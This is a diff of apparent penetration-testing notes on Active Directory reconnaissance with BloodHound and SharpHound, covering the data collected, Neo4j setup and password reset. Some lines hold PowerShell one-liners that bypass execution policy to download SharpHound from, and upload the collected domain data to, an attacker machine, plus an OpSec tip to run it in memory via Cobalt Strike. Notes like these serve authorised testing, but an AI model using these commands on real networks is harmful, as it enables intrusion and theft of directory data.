@@ -41,65 +41,65 @@ Look for PdcRoleOwner and Name
 
 # BloodHound
 
-BloodHound uses graph theory to identify critical attack paths in Active Directory.
-It enables you to quickly identify misconfigurations, simulate complex attack paths and bring greater awareness to Active Directory risks.
+BloodHound uses graph theory to identify critical attack paths in Active Directory. It enables you to quickly identify
+misconfigurations, simulate complex attack paths, and bring greater awareness to Active Directory risks.
 
 SharpHound is built on top of Windows Native APIs.
 It uses Microsoft's System.DirectoryServices.Protocols namespace to query information via LDAP.
-It also leverages the following Microsoft Win32API functions to query information form servers and workstations:
+It also leverages the following Microsoft Win32API functions to query information from servers and workstations:
 	NetSessionEnum
 	NetWkstUserEnum
 	NetWkstaGetInfo
 	NetLocalGroupMembers
 
-The default collection method will collect the following pieces of information from the domain controller:
+SharpHound will automatically determine what domain your current user belongs to, find a domain controller for that domain,
+and start the “default” collection method. The default collection method will collect the following pieces of information
+from the domain controller:
 * Security group memberships
 * Domain trusts
 * Abusable rights on Active Directory objects
 * Group Policy links
 * OU tree structure
-* Several properties from computer, group and user objects
+* Several properties from computer, group, and user objects
 * SQL admin links
 
 Additionally, SharpHound will attempt to collect the following information from each domain-joined Windows computer:
 * The members of the local administrators, remote desktop, distributed COM, and remote management groups
 * Active sessions, which SharpHound will attempt to correlate to systems where users are interactively logged on
 
-Anywhere from 1 second to a couple minutes.
-Session Enumeration on servers can take upwards of 10-15 minutes if theres a large number of sessions.
+When finished, SharpHound will create several JSON files and place them into a zip file.
+Upload the file to Kali
+  powershell -nop -exec bypass "IEX (New-Object Net.Webclient).UploadString('http://192.168.1.5/sharp.zip',"<PostDATA>")"
+Drag and drop that zip file into the BloodHound GUI and the interface will take care of merging the data into the database.
+
+- Collection time
+Anywhere from a second to a couple minutes.
+Session enumeration on servers can take 10-15 minutes if there are a large number of sessions.
 
 https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
 PS> Import-Module .\SharpHound.ps1
 Invoke-BloodHound -CollectionMethod All
 
+- Setup Neo4j
 neo4j console
-Split the screen horizontally
-xdg-open http://localhost:7474 &
-Login with username and password: neo4j
-Set a new password
+Open http://localhost:7474
+Login with neo4j:neo4j
+Set your new password > Connect
+Go back to Terminal > right-click > Split Terminal Horizontally
+bloodhound
+Login with ne04j:<new password>
 
-- How to reset the default password for neo4j
+- Reset the default neo4j password
 /usr/share/neo4j/bin/neo4j-admin set-initial-password neo4j
 xdg-open http://localhost:7474 &
 Login with username and password: neo4j
 Set a new password.
 
-- Windows
-cd to a discrete, writable directory (C:\Users\<user>\Desktop)
-powershell -nop -exec bypass "IEX (New-Object Net.Webclient).DownloadFile('http://192.168.1.5:8000/SharpHound.exe', 'SharpHound.exe')"
+- AzureHound
+https://github.com/BloodHoundAD/AzureHound/releases
 
-SharpHound.exe -c LoggedOn                        Run the following as a user that has admin rights
-SharpHound.exe -c Session                         On subsequent runs just collect session data
-
-This will generate a zip file
-Upload the file to Kali
-powershell -nop -exec bypass "IEX (New-Object Net.Webclient).UploadString('http://192.168.1.5/sharp.zip',"<PostDATA>")"
-
-- BloodHound UI
-cd /opt/BloodHound-v4/BloodHound-linux-x64/
-./BloodHound --no-sandbox
-Login
-Drag and drop the zip file into the UI
+- OpSec
+Run SharpHound in memory using Cobalt Strike’s execute-assembly command.
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # ADACLScanner
